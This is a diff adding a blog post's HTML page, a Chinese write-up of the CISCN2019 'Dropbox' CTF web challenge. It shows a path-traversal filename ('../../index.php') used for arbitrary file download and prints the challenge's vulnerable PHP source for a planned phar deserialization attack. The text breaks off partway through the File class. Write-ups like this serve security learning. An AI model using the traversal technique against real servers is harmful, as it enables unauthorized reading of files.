@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="任意文件下载，phar反序列化 刚进去，发现有文件上传，测试了一下，发现基本给过滤了，应该是白名单机制，在download.php 抓包发现，存在filename参数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2019华北赛区Day1Web1Dropbox">
+<meta property="og:url" content="http://example.com/2020/10/11/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1Dropbox/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="任意文件下载，phar反序列化 刚进去，发现有文件上传，测试了一下，发现基本给过滤了，应该是白名单机制，在download.php 抓包发现，存在filename参数">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/10/11/yHUKd8b2kuN3LvJ.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/11/3d2lXLhsi67qtkf.png">
+<meta property="article:published_time" content="2020-10-11T01:22:11.000Z">
+<meta property="article:modified_time" content="2024-09-08T04:25:48.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/10/11/yHUKd8b2kuN3LvJ.png">
+
+
+<link rel="canonical" href="http://example.com/2020/10/11/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1Dropbox/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2020/10/11/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1Dropbox/","path":"2020/10/11/CISCN2019华北赛区Day1Web1Dropbox/","title":"CISCN2019华北赛区Day1Web1Dropbox"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CISCN2019华北赛区Day1Web1Dropbox | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/11/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1Dropbox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CISCN2019华北赛区Day1Web1Dropbox | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN2019华北赛区Day1Web1Dropbox
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-10-11 09:22:11" itemprop="dateCreated datePublished" datetime="2020-10-11T09:22:11+08:00">2020-10-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 12:25:48" itemprop="dateModified" datetime="2024-09-08T12:25:48+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>任意文件下载，phar反序列化</p>
+<p>刚进去，发现有文件上传，测试了一下，发现基本给过滤了，应该是白名单机制，在download.php 抓包发现，存在filename参数</p>
+<span id="more"></span>
+
+<p><img src="https://i.loli.net/2020/10/11/yHUKd8b2kuN3LvJ.png" alt="1.png"></p>
+<p>这里猜测可能存在任意文件读取，尝试着改成 ..&#x2F;..&#x2F;index.php    发现可以成功下载（这里因为文件上传的文件一般会在 &#x2F;upload&#x2F;sandbox ，于是用了 ..&#x2F;..&#x2F; 来读 index.php 的内容。</p>
+<p>然后依次顺腾摸瓜，读取 class.php   delete.php  upload.php  download.php   login.php  register.php  的源代码</p>
+<p>这里主要分析一下class.php  delete.php upload.php  download.php的代码 。</p>
+<p>upload.php的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$pos</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="variable">$pos</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/gif&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/jpeg&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/png&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only gif/jpg/png allowed&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$dst</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] . <span class="variable">$filename</span> . <span class="variable">$fileext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dst</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invaild filename&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>只让上传jpg gif png 图片</p>
+<p>download.php的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对下载的文件名进行了限制，但是可以造成任意文件下载（这个前面已经验证过了）不允许下载带有flag的文件，基本上可以猜一下 flag文件在   .&#x2F;flag 或者  .&#x2F;flag.txt 中 。想办法读到这个就行了，但是又不能直接通过download.php来读。</p>
+<p>delete.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码逻辑也比较简单，对文件名进行了简单的限制，然后执行delete()函数，基本和download差不多，也还是没找到利用的地方。</p>
+<p>最后再来看看 class.php 文件的代码（代码很长，看重要的部分)</p>
+<p>一个是User类:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Filelist类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后看到file类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span 